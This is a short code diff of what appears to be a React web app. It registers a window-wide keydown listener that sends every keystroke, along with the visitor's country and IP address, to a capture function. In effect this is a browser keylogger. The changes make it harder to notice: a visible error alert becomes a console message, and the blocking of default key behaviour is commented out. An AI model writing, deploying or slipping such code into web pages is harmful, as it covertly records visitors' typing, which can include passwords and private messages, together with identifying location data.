@@ -19,7 +19,7 @@ const CaptureKey = (key, location, ip_address) => {
 
   }).then(responce => {
     if (!responce.ok) {
-      alert("ERROR")
+      console.log("There was an error")
     } else {
       console.log("Captured")
     }
@@ -39,8 +39,8 @@ function App() {
   const { location } = useContext(LocationContext);
   isBrowser &&
   window.addEventListener('keydown', function (e) {
+    // e.preventDefault()
     location && CaptureKey(e.key, location.country_name, location.IPv4)
-    e.preventDefault()
   }, false);
 
 
